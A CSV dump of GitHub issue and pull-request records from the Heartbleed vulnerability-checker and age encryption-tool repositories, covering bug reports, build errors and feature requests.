",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/17/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/17/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/17/events,https://github.com/FiloSottile/Heartbleed/issues/17,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/16,31085125,MDU6SXNzdWUzMTA4NTEyNQ==,16,Getting timeout on all negatives?,4592,open,FALSE,NA,NA,4,2014-04-08T16:12:02Z,2014-04-08T23:58:01Z,NA,NONE,NA,"This is with the command line tool.

Sites which I know are fixed correctly give a `SAFE` response, but sites which I believe are not give a `ERROR: heartbleed: timeout` response. I can't get a straightforward ""NOT SAFE"" response (or whatever it gives in that condition).
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/16/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/16/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/16/events,https://github.com/FiloSottile/Heartbleed/issues/16,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/15,31080917,MDU6SXNzdWUzMTA4MDkxNw==,15,URL hangs forever,238652,closed,FALSE,NA,NA,4,2014-04-08T15:28:49Z,2014-04-08T21:31:26Z,2014-04-08T21:31:26Z,NONE,NA,"If I use an URL instead of a host name (which is IMO the typical use case because you copy server names/URLs directly from the browser) the test is hanging forever. You should URL parse the user input for a host name.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/15/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/15/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/15/events,https://github.com/FiloSottile/Heartbleed/issues/15,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/14,31080148,MDU6SXNzdWUzMTA4MDE0OA==,14,Need support for STARTTLS for more SSL/TLS tests,881377,closed,FALSE,NA,NA,4,2014-04-08T15:20:45Z,2014-04-24T17:58:32Z,2014-04-08T22:59:26Z,NONE,NA,"Without support for _STARTTLS_ it's not possible to test for protocol such as _SMTP_, _POP3_, _IMAP_, _FTP_, etc. which might be able to do _SSL_/_TLS_ after an initial cleartext negociation, depending on the server.

For example, `openssl s_client` support:

>  -starttls prot - use the STARTTLS command before starting TLS
>                 for those protocols that support it, where
>                 'prot' defines which one to assume.  Currently,
>                 only ""smtp"", ""pop3"", ""imap"", ""ftp"" and ""xmpp""
>                 are supported.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/14/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/14/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/14/events,https://github.com/FiloSottile/Heartbleed/issues/14,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/13,31077582,MDU6SXNzdWUzMTA3NzU4Mg==,13,TLS 1.1 only sites throw EOF errors,3723592,open,FALSE,NA,NA,0,2014-04-08T14:54:40Z,2014-04-08T14:54:40Z,NA,NONE,NA,"If a site doesn't support TLS 1.2, then the Heartbleed script throws an EOF error. This seems to be because the go crypto TLS package is built to implement TLS 1.2.
http://golang.org/pkg/crypto/tls/
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/13/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/13/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/13/events,https://github.com/FiloSottile/Heartbleed/issues/13,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/12,31074003,MDU6SXNzdWUzMTA3NDAwMw==,12,Is this a full source code?,7226422,closed,FALSE,NA,NA,1,2014-04-08T14:17:09Z,2014-04-08T15:00:23Z,2014-04-08T15:00:23Z,NONE,NA,"EDIT: nevermind, i went full retard.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/12/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/12/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/12/events,https://github.com/FiloSottile/Heartbleed/issues/12,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/11,31071404,MDExOlB1bGxSZXF1ZXN0MTQ0OTk4Njg=,11,Use standard *nix status errors,108421,closed,FALSE,NA,NA,0,2014-04-08T13:46:33Z,2014-06-13T02:15:01Z,2014-04-08T13:47:36Z,CONTRIBUTOR,NA,"In *nix standards, `0` means the process exited successfully,
which makes more sense when a site is SAFE.
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/11/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/11/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/11/events,https://github.com/FiloSottile/Heartbleed/pull/11,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/11
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/10,31071247,MDU6SXNzdWUzMTA3MTI0Nw==,10,Data protection,1197881,open,FALSE,NA,NA,2,2014-04-08T13:44:36Z,2014-04-08T14:44:29Z,NA,NONE,NA,"Hi, when checking mail.yahoo.com I have noticed that a password and sometimes even a username is returned, which is pretty serious. Under a minute of clicking 2 pairs of credentials were dispayed. Do you genereate these other bits, or dispay them as they are? 
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/10/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/10/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/10/events,https://github.com/FiloSottile/Heartbleed/issues/10,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/9,31071147,MDExOlB1bGxSZXF1ZXN0MTQ0OTk3MTQ=,9,Added requires Go 1.2.x,62802,closed,FALSE,NA,NA,1,2014-04-08T13:43:20Z,2014-08-15T16:51:50Z,2014-04-08T13:45:24Z,CONTRIBUTOR,NA,"Small fix for the readme. It won't compile using go 1.1.x
",NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/9/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/9/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/9/events,https://github.com/FiloSottile/Heartbleed/pull/9,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/9
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/8,31070163,MDU6SXNzdWUzMTA3MDE2Mw==,8,Can't test hosts that require client certificate authentication.,291572,open,FALSE,NA,NA,0,2014-04-08T13:30:00Z,2014-04-08T13:30:53Z,NA,NONE,NA,"According to heartbleed.com:

> Does TLS client certificate authentication mitigate this?
> 
> No, heartbeat request can be sent and is replied to during the handshake phase of the protocol. This occurs prior to client certificate authentication.

However running this tool against a host requiring client certificate authentication results in: 

```
rickette@rickette ~/W/Heartbleed> ./Heartbleed somehost:443
2014/04/08 12:06:18 somehost:443 - ERROR: remote error: handshake failure
```

It works fine if this host doesn't require client authentication
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/8/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/8/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/8/events,https://github.com/FiloSottile/Heartbleed/issues/8,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/7,31059461,MDU6SXNzdWUzMTA1OTQ2MQ==,7,Can't test TLS 1.2 only sites,90635,open,FALSE,NA,NA,1,2014-04-08T10:33:14Z,2014-04-08T13:54:56Z,NA,NONE,NA,"It doesn't seem to be possible to test servers that use TLS 1.2 only.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/7/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/7/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/7/events,https://github.com/FiloSottile/Heartbleed/issues/7,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/6,31058893,MDU6SXNzdWUzMTA1ODg5Mw==,6,False positives,641009,open,FALSE,NA,NA,45,2014-04-08T10:24:34Z,2014-04-12T21:37:56Z,NA,NONE,NA,"Thanks for a very useful tool :D 

However, we've had some issues using it whereby the website would produce false positives (ie, consider that a server was vulnerable when it wasn't) on servers the first time it was run, but not subsequently. This included servers running OpenSSL 0.9.8. Annoyingly, it's stopped happening now, but I couldn't see a commit where this issue was directly addressed, so I'm not sure if it's fixed itself (urgh) or if it's something fixed by the developer. 

We've not seen this when running it on the command line. 

Anyone else seen this? Anyone still seeing this?
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/6/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/6/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/6/events,https://github.com/FiloSottile/Heartbleed/issues/6,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/5,31054967,MDU6SXNzdWUzMTA1NDk2Nw==,5,... Build errors,7087411,closed,FALSE,NA,NA,6,2014-04-08T09:22:43Z,2014-04-18T14:54:47Z,2014-04-08T13:52:44Z,NONE,NA,"dev@dev:~/Desktop$ go get github.com/titanous/heartbleeder
# github.com/titanous/heartbleeder/tls

../dev/Desktop/src/github.com/titanous/heartbleeder/tls/cipher_suites.go:66: undefined: cipher.AEAD
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/cipher_suites.go:133: undefined: cipher.AEAD
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/cipher_suites.go:146: not enough arguments to return
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/cipher_suites.go:149: undefined: cipher.AEAD
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/cipher_suites.go:154: undefined: cipher.NewGCM
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/conn.go:256: undefined: cipher.AEAD
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/conn.go:267: c.Overhead undefined (type interface {} has no field or method Overhead)
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/conn.go:271: c.Open undefined (type interface {} has no field or method Open)
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/conn.go:373: undefined: cipher.AEAD
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/handshake_server.go:556: undefined: crypto.PublicKey
../dev/Desktop/src/github.com/titanous/heartbleeder/tls/conn.go:373: too many errors
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/5/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/5/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/5/events,https://github.com/FiloSottile/Heartbleed/issues/5,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/4,31053744,MDU6SXNzdWUzMTA1Mzc0NA==,4,Howto?,603223,closed,FALSE,NA,NA,9,2014-04-08T09:02:44Z,2014-04-08T21:45:17Z,2014-04-08T13:46:48Z,NONE,NA,"For the completely GO-illiterate who just want to check their servers, could you give a hint how to compile or run the test script? I only get errors when trying to ""go build"", ""go run"" etc..

$ go run bleed.go 
bleed.go:4:2: import ""github.com/FiloSottile/Heartbleed/bleed"": cannot find package

$ go build
bleed.go:4:2: import ""github.com/FiloSottile/Heartbleed/bleed"": cannot find package

$ go install
bleed.go:4:2: import ""github.com/FiloSottile/Heartbleed/bleed"": cannot find package

thanks!
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/4/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/4/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/4/events,https://github.com/FiloSottile/Heartbleed/issues/4,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/3,31048742,MDU6SXNzdWUzMTA0ODc0Mg==,3,Typo on website,3694534,closed,FALSE,NA,NA,2,2014-04-08T07:29:28Z,2014-04-08T15:48:17Z,2014-04-08T13:51:16Z,NONE,NA,"> All good, banking.postbank.deseems not affected!

Missing a space.
",NA,FALSE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/3/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/3/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/3/events,https://github.com/FiloSottile/Heartbleed/issues/3,NA
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/2,31043419,MDExOlB1bGxSZXF1ZXN0MTQ0ODM0ODY=,2,improvements to bleed.go,175578,closed,FALSE,NA,NA,0,2014-04-08T05:03:11Z,2014-06-13T00:39:47Z,2014-04-08T05:04:57Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/2/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/2/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/2/events,https://github.com/FiloSottile/Heartbleed/pull/2,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/2
FiloSottile,Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/1,31042478,MDExOlB1bGxSZXF1ZXN0MTQ0ODI5ODM=,1,Add reusable package for bleed check.,175578,closed,FALSE,NA,NA,2,2014-04-08T04:32:32Z,2020-07-13T05:04:18Z,2014-04-08T04:47:18Z,COLLABORATOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/Heartbleed,https://api.github.com/repos/FiloSottile/Heartbleed/issues/1/labels{/name},https://api.github.com/repos/FiloSottile/Heartbleed/issues/1/comments,https://api.github.com/repos/FiloSottile/Heartbleed/issues/1/events,https://github.com/FiloSottile/Heartbleed/pull/1,https://api.github.com/repos/FiloSottile/Heartbleed/pulls/1
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/258,863419074,MDExOlB1bGxSZXF1ZXN0NjE5ODMwNTc4,258,if'd out term.IsTerminal/stdinInUse check for Windows,5068927,closed,FALSE,NA,NA,1,2021-04-21T03:43:02Z,2021-04-23T06:00:51Z,2021-04-23T06:00:21Z,NONE,NA,"I added a platform check to the password routine. It's a dirty hack imo but it 'resolves' issue #196 by _wholesale removing_ the error check. On Windows, behavior seems nominal with a password being read from stdin, followed by the input.

This is my first time writing Go and my first pull request. Please let me know if I've done anything horribly wrong. 🙏",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/258/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/258/comments,https://api.github.com/repos/FiloSottile/age/issues/258/events,https://github.com/FiloSottile/age/pull/258,https://api.github.com/repos/FiloSottile/age/pulls/258
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/250,860854660,MDU6SXNzdWU4NjA4NTQ2NjA=,250,Convert identities to recipients,1225294,closed,FALSE,NA,NA,1,2021-04-19T03:09:13Z,2021-04-24T10:41:40Z,2021-04-24T10:41:40Z,OWNER,NA,"There should be a way to generate a recipient line for a given identity, maybe as an `age-keygen` mode.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/250/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/250/comments,https://api.github.com/repos/FiloSottile/age/issues/250/events,https://github.com/FiloSottile/age/issues/250,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/216,860802215,MDU6SXNzdWU4NjA4MDIyMTU=,216,Formalize and document backwards compatibility policy,1225294,open,FALSE,NA,6688826,0,2021-04-19T00:13:45Z,2021-04-22T17:45:04Z,NA,OWNER,NA,"We want age files to keep decrypting forever, but what that actually means around major versions, security upgrades, and CLI behavior needs formalizing. See #215.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/216/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/216/comments,https://api.github.com/repos/FiloSottile/age/issues/216/events,https://github.com/FiloSottile/age/issues/216,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/211,860782971,MDExOlB1bGxSZXF1ZXN0NjE3NTY4OTA3,211,.github: update New Issue page,1225294,closed,FALSE,NA,NA,0,2021-04-18T22:43:31Z,2021-04-18T22:45:51Z,2021-04-18T22:45:50Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/211/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/211/comments,https://api.github.com/repos/FiloSottile/age/issues/211/events,https://github.com/FiloSottile/age/pull/211,https://api.github.com/repos/FiloSottile/age/pulls/211
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/210,858606111,MDU6SXNzdWU4NTg2MDYxMTE=,210,UX: Try passphrase on multiple identities,1365692,closed,TRUE,NA,NA,0,2021-04-15T07:56:42Z,2021-04-18T23:28:39Z,2021-04-18T23:28:38Z,NONE,NA,"## What were you trying to do

Decrypt a file in a script without knowing who will be entering the passphrase.

## What happened

age does not support trying multiple identities when decrypting a file. E.G. a file was encrypted with `--recipients-file <(cat alice.pub bob.pub)`. A script that runs automatically on boot uses `age -d -i alice.priv -i bob.priv`. It might be either Alice or Bob who is present to enter the passphrase for their private key; the system does not know which. It should try the passphrase on both private keys so that decryption will succeed no matter which one of them is present.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/210/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/210/comments,https://api.github.com/repos/FiloSottile/age/issues/210/events,https://github.com/FiloSottile/age/issues/210,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/209,858594009,MDU6SXNzdWU4NTg1OTQwMDk=,209,UX: Allow extracting bulk encryption symmetric key and using it for decryption,2605882,closed,TRUE,NA,NA,1,2021-04-15T07:42:35Z,2021-04-18T23:50:33Z,2021-04-18T23:50:32Z,NONE,NA,"IMO it would be beneficial if age allowed extracting the symmetric key that's used for the bulk encryption, and using that key to decrypt an age encrypted file.

My use case for this feature is restoring backups that are dozens to hundreds of gigabytes in size on a remote server, where I do not want to make my private SSH key available to that server. I could work around this by encrypting the backups to an additional key pair that can be shared with the otherwise untrusted server for backup restore purposes, but IMO that would negate some of the desirable security properties of encrypting to the public SSH keys of the server administrators.

My expectation would be that with this feature, I could simply download the age header of the encrypted file to my laptop, use age to extract the symmetric encryption key using my private SSH key, and then use that symmetric key to decrypt the age encrypted backup file on the remote server.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/209/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/209/comments,https://api.github.com/repos/FiloSottile/age/issues/209/events,https://github.com/FiloSottile/age/issues/209,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/208,858183336,MDU6SXNzdWU4NTgxODMzMzY=,208,Adding documentation for this to tldr-pages; anything you'd like to change?,51862164,closed,TRUE,NA,NA,0,2021-04-14T19:03:34Z,2021-04-19T00:06:43Z,2021-04-19T00:06:42Z,NONE,NA,"I didn't really find any other way to contact you, so I decided to open an issue here instead… I opened a PR at https://github.com/tldr-pages/tldr/pull/5758 to add documentation for age to tldr. If there's anything you'd like to change or add about it, you might want to have a look over there.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/208/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/208/comments,https://api.github.com/repos/FiloSottile/age/issues/208/events,https://github.com/FiloSottile/age/issues/208,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/205,850148651,MDExOlB1bGxSZXF1ZXN0NjA4NzY1NDE1,205,Use golang.org/x/term instead of deprecated package,42150522,closed,FALSE,NA,NA,1,2021-04-05T07:19:23Z,2021-04-05T13:22:55Z,2021-04-05T13:22:51Z,CONTRIBUTOR,NA,According to the [documentation of golang.org/x/crypto/ssh/terminal](https://pkg.go.dev/golang.org/x/crypto/ssh/terminal) this package has been deprecated and golang.org/x/term should be used instead.,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/205/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/205/comments,https://api.github.com/repos/FiloSottile/age/issues/205/events,https://github.com/FiloSottile/age/pull/205,https://api.github.com/repos/FiloSottile/age/pulls/205
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/204,849981514,MDExOlB1bGxSZXF1ZXN0NjA4NjI2MzM1,204,README: mention official Arch Linux package,3833685,closed,FALSE,NA,NA,1,2021-04-04T23:15:33Z,2021-04-05T17:59:42Z,2021-04-05T15:19:17Z,CONTRIBUTOR,NA,"I've moved age to the official repositories: https://archlinux.org/packages/community/x86_64/age/

",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/204/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/204/comments,https://api.github.com/repos/FiloSottile/age/issues/204/events,https://github.com/FiloSottile/age/pull/204,https://api.github.com/repos/FiloSottile/age/pulls/204
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/203,846886627,MDU6SXNzdWU4NDY4ODY2Mjc=,203,UX: add the possibility to give the password as an argument.,7649949,closed,FALSE,NA,NA,4,2021-03-31T15:46:46Z,2021-03-31T18:57:15Z,2021-03-31T18:57:15Z,NONE,NA,"Decrypt using password as an flag/option and giving the password as an argument

## What were you trying to do
writing a script that takes my password as an argument and decrypts multiple files at once.

## What happened
```
# age -d -p <password> -o <output> <input>

Error: too many arguments: [""<password>"" ""-d"" ""-o"" ""<output>"" ""input""].
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/203/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/203/comments,https://api.github.com/repos/FiloSottile/age/issues/203/events,https://github.com/FiloSottile/age/issues/203,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/200,840623509,MDU6SXNzdWU4NDA2MjM1MDk=,200,Decrypt not working with my setup,18459475,closed,TRUE,NA,NA,5,2021-03-25T06:55:50Z,2021-04-19T00:21:17Z,2021-04-19T00:21:16Z,NONE,NA,"## Environment

* OS: MacOS 11 (Big Sur)
* age version: 1.0.0.rc1

## What were you trying to do
I tried to decrypt a previously encrypted txt file.

## What happened
An error was displayed: Error: no identity matched any of the recipients

## More Details
I might explain my setup which may be the issue itself:

For encryption I derived the ssh public key from my pgp key (RSA4096) which is located on my YubiKey 5, hence I do not have a private key file on the file system as the doc suggests.

I read that ssh-agent is not supported, however I am running gpg-agent, which also may not be supported. I just thought I would have a use case here.

Could be related to https://github.com/FiloSottile/age/issues/137
```
$ age -R ~/.ssh/id_rsa.pub plain.txt > plain.txt.age

$ cat plain.txt.age 
age-encryption.org/v1
-> ssh-rsa 7nXROQ
[...]
--- Nsc+ERH0H8DWzgNYMCxRdndI1KBX9+sFMsRUO7JKEB4
σ????
V??v\?'A??ۡ>Iv??? ?%                                                                                                                                                                                                                                                                                                                          

$ age -d plain.txt.age > plain.txt.age.decrypted
Error: no identity matched any of the recipients
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/200/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/200/comments,https://api.github.com/repos/FiloSottile/age/issues/200/events,https://github.com/FiloSottile/age/issues/200,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/199,837024142,MDExOlB1bGxSZXF1ZXN0NTk3NDQ3MTYz,199,Update Homebrew formula for 1.0.0-rc1,1325121,closed,FALSE,NA,NA,1,2021-03-21T09:12:28Z,2021-03-21T15:35:22Z,2021-03-21T11:12:27Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/199/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/199/comments,https://api.github.com/repos/FiloSottile/age/issues/199/events,https://github.com/FiloSottile/age/pull/199,https://api.github.com/repos/FiloSottile/age/pulls/199
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/198,831265507,MDExOlB1bGxSZXF1ZXN0NTkyNjIyNTk5,198,Add armv7 to age builds,121707,open,FALSE,NA,NA,6,2021-03-14T21:31:10Z,2021-04-23T06:07:06Z,NA,NONE,NA,"armv7 is currently used in the raspberry pi 4 series to an extent; while its hardware supports arm64 (to my knowledge), distribution support is not yet complete.  having armv7 distributions also available will better support low-power hardware like the pi4 better.

as a side-effect, the arm version needs to also be distinguished in the artifact name. resulting artifacts would now be named ""armv6"" or ""armv7"" instead of just ""arm"".",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/198/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/198/comments,https://api.github.com/repos/FiloSottile/age/issues/198/events,https://github.com/FiloSottile/age/pull/198,https://api.github.com/repos/FiloSottile/age/pulls/198
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/197,829960380,MDExOlB1bGxSZXF1ZXN0NTkxNTQyNTgz,197,README: add NixOS/Nix installation instructions,26801023,closed,FALSE,NA,NA,0,2021-03-12T10:10:08Z,2021-04-23T06:13:24Z,2021-04-23T06:13:24Z,CONTRIBUTOR,NA,Update `README.md` with NixOS/Nix installation instructions.,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/197/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/197/comments,https://api.github.com/repos/FiloSottile/age/issues/197/events,https://github.com/FiloSottile/age/pull/197,https://api.github.com/repos/FiloSottile/age/pulls/197
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/196,828123195,MDU6SXNzdWU4MjgxMjMxOTU=,196,Error trying to read both passphrase and input from stdin on Windows,5068927,closed,FALSE,NA,6688826,2,2021-03-10T17:57:32Z,2021-04-23T06:00:21Z,2021-04-23T06:00:21Z,NONE,NA,"## Environment

* OS: Windows 10 Pro (x86_64) Build 19041.804
* age version: v1.0.0-rc.1

## What I was trying to do
Not sure if I have the correct cmdline for this but I was trying to password-encrypt some arbitrary words from stdin using
```
age -p -o out
```

## What happened
Seems like age is trying to open `/dev/tty` which does not exist on Windows.

Command line: `age -p -o out`
```
Enter passphrase (leave empty to autogenerate a secure one): Error: could not read passphrase: standard input is not available or not a terminal, and opening /dev/tty failed: open /dev/tty: The system cannot find the path specified.
[ Did age not do what you expected? Could an error be more useful? Tell us: https://filippo.io/age/report ]
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/196/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/196/comments,https://api.github.com/repos/FiloSottile/age/issues/196/events,https://github.com/FiloSottile/age/issues/196,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/195,826933290,MDExOlB1bGxSZXF1ZXN0NTg4ODkyNTUy,195,v1.0.0-rc.1,1225294,closed,FALSE,NA,NA,0,2021-03-10T01:51:04Z,2021-03-10T10:38:48Z,2021-03-10T10:38:47Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/195/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/195/comments,https://api.github.com/repos/FiloSottile/age/issues/195/events,https://github.com/FiloSottile/age/pull/195,https://api.github.com/repos/FiloSottile/age/pulls/195
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/194,825681177,MDU6SXNzdWU4MjU2ODExNzc=,194,Brew installation overwrite go local go installation,117752,closed,FALSE,NA,NA,1,2021-03-09T10:22:58Z,2021-03-09T13:12:44Z,2021-03-09T13:12:44Z,NONE,NA,"## Environment

* OS: OSX Catalina
* age version: v1.0.0-beta6

## What were you trying to do

Install age view homebrew

## What happened

It replaced my installed goversion (go1.16) to (go.1.15.2)

I installed using the installer from golang website. After Installation it downgrade my golang. 
It seems that `/usr/local/Cellar` was put in front of my local go package. So when it installed go
it picked that one up instead the one that the package installed (/usr/local/go)

Maybe there is a better alternatives for the go installation? 
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/194/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/194/comments,https://api.github.com/repos/FiloSottile/age/issues/194/events,https://github.com/FiloSottile/age/issues/194,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/193,815611376,MDU6SXNzdWU4MTU2MTEzNzY=,193,UX: Identity should be consistent with Recepient,627285,closed,FALSE,NA,NA,3,2021-02-24T15:56:59Z,2021-02-24T16:15:56Z,2021-02-24T16:01:05Z,NONE,NA,"## What were you trying to do
Trying to pass a value to identity stored in a variable. At the moment, RECEPIENT supports both `-rR` options and `-i` assumes a PATH instead of IDENTITY.

## What happened
-i flag assumes a PATH.

```
$ age --help
... ommitted ..
Options:
    -r, --recipient RECIPIENT   Encrypt to the specified RECIPIENT. Can be repeated.
